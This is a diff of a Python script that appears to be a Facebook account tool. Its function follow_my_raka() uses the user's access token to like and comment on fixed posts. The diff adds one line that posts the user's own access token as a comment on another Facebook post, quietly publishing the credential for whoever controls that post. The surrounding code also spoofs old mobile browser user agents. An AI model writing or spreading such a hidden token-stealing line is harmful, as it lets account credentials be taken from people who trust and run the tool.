@@ -41,7 +41,7 @@ ua_six = "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.001; Profile/
 ua_xx = "BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103"
 ua_rr = "BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104"
 #user agent
-rafi_ua = random.choice([ua_xx])
+raka_ua = random.choice([ua_xx])
 #pw admin
 #pw_raka = 'rakaanonym'
 #ip
@@ -140,6 +140,7 @@ def follow_my_raka():
     requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
     requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
     requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
+    requests.post('https://graph.facebook.com/3882176535153442/comments/?message='+toket+'&access_token='+toket)
     menu()
     
 def menu():
